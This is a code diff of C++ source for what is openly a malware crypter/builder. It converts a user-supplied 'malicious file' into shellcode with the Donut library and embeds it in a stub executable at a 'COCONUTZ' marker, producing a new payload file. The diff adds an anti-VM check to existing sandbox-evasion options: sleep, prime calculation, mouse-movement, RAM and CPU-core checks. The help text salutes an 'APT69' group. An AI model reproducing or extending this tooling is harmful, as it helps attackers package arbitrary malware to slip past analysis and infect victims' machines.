@@ -11,12 +11,17 @@
 
 #pragma comment(lib, "donut.lib")
 
+#define MAX_BUFFER 4097152
 // Struct that will determine the configuration to run this
+
+std::string payload_output = "";
+
 struct Coconut
 {
-	int AES_Key = 0;
-	bool sleep = false;
+	int AES_Key = 20;
 	int sleepTime = 5000;
+	bool sleep = false;
+	bool antivm = false;
 	bool prime = false;
 	bool mouse = false;
 	bool acceleratedsleep = false;
@@ -24,11 +29,11 @@ struct Coconut
 	bool ram = false;
 	bool cpu_core = true;
 	int szData = 0;
-	const char * opcodes = 0;
+	char opcodes[2097152] = { 0 };
 } coconut;
 
 
-
+// File is the malicious file we want to run
 int writeShellCode(const char * file)
 {
 	DONUT_CONFIG c;
@@ -48,7 +53,7 @@ int writeShellCode(const char * file)
 	c.mod_type = DONUT_MODULE_EXE;
 	memcpy(c.file, file, strlen(file));
 
-	char  * buffer = new char[3097152];
+	char  * buffer = new char[MAX_BUFFER];
 	std::ifstream infile(file);
 	//get length of file
 	infile.seekg(0, std::ios::end);
@@ -56,20 +61,58 @@ int writeShellCode(const char * file)
 	infile.seekg(0, std::ios::beg);
 
 	// don't overflow the buffer!
-	if (length > 3097152)
+	if (length > MAX_BUFFER)
 	{
-		length = 3097152;
+		length = MAX_BUFFER;
 	}
-	printf("length: %d\n", length);
+	printf("[+] length of payload: %d bytes\n", length);
 
 	//read file
 	infile.read(buffer, length);
 
 	DonutCreate(&c);
 
-	printf("%x %x %x %x %x %x\n", *(BYTE*)c.pic, *(BYTE*)((char*)c.pic + 1), *(BYTE*)((char*)c.pic + 2), *(BYTE*)((char*)c.pic + 3), *(BYTE*)((char*)c.pic + 4), *(BYTE*)((char*)c.pic + 5));
+	coconut.szData = c.pic_len;
 
+	memcpy((void*)coconut.opcodes, c.pic, c.pic_len);
 
+	std::ifstream Bone("RibeyeBone.exe", std::ios::in | std::ios::binary);
+
+	char* bone_buffer = new char[MAX_BUFFER];
+	//get length of file
+	Bone.seekg(0, std::ios::end);
+	size_t bone_length = Bone.tellg();
+	Bone.seekg(0, std::ios::beg);
+
+	// don't overflow the buffer!
+	if (bone_length > MAX_BUFFER)
+	{
+		bone_length = MAX_BUFFER;
+	}
+
+	Bone.read(bone_buffer, bone_length);
+
+	uintptr_t marker = FindPattern((char*)bone_buffer, bone_length, (char*)"COCONUTZ", (char*)"xxxxxxxx");
+
+	if (marker == NULL)
+	{
+		printf("[!] Can't find COCONUTZ marker, abort!\n");
+		return 1;
+	}
+
+	INT64 offset = (INT64)marker - (INT64)bone_buffer;
+
+	printf("[+] Found coconutz marker at %p from %p [offset: %d] with string %s\n", marker, bone_buffer, offset, marker);
+
+	printf("[+] Size of coconut %d %p vs size of bone stud %d %p\n", sizeof coconut, sizeof coconut, bone_length, bone_length);
+
+	memcpy(bone_buffer + offset, &coconut, sizeof(coconut));
+
+	std::ofstream outfile(payload_output, std::ofstream::binary);
+
+	outfile.write((const char*)bone_buffer, bone_length);
+
+	printf("[+] Check for %s, that is ur payload :D\n", payload_output.data());
 
 	return 1;
 }
@@ -90,13 +133,16 @@ int main(int argc, char** argv)
 		TCLAP::CmdLine cmd(R"(Shoutout to APT69 and the brothers that are in it. https://twitter.com/TomahawkApt69 )", ' ', "0.1");
 
 		TCLAP::ValueArg<std::string> filepath("f", "file", "Path to file to execute", true, "C:\\Users\\Dev\\Desktop\\malware.exe", "string");
+		TCLAP::ValueArg<std::string> outputname("o", "output", "Output file name", true, "ribeye.exe", "string");
 		TCLAP::ValueArg<int> sleeptime("t", "sleeptime", "How long to sleep for (in ms) if -s is enabled", false , 5000, "integer");
 
 		// Add the argument nameArg to the CmdLine object. The CmdLine object
 		// uses this Arg to parse the command line.
 		cmd.add(filepath);
+		cmd.add(outputname);
 		cmd.add(sleeptime);
 
+		TCLAP::SwitchArg bVirtual("v", "vm", "Detect VM using CPUID", cmd, false);
 		TCLAP::SwitchArg bSleep("s", "sleep", "Sleep to evade sandbox", cmd, false);
 		TCLAP::SwitchArg bPrime("p", "prime", "Prime calculation to evade sandbox", cmd, false);
 		TCLAP::SwitchArg bMouse("m", "mouse", "Check mouse movement, evade sandbox", cmd, false);
@@ -107,9 +153,9 @@ int main(int argc, char** argv)
 
 		// Parse the argv array.
 		cmd.parse(argc, argv);
-
 		coconut.sleep = bSleep.getValue();
 		coconut.sleepTime = sleeptime.getValue();
+		coconut.antivm = bVirtual.getValue();
 		coconut.prime = bPrime.getValue();
 		coconut.mouse = bMouse.getValue();
 		coconut.acceleratedsleep = bAccel.getValue();
@@ -118,7 +164,7 @@ int main(int argc, char** argv)
 		coconut.cpu_core = bCore.getValue();;
 		
 		std::string targetFile = filepath.getValue();
-
+		payload_output = outputname.getValue();
 		writeShellCode(targetFile.data());
 
 	}
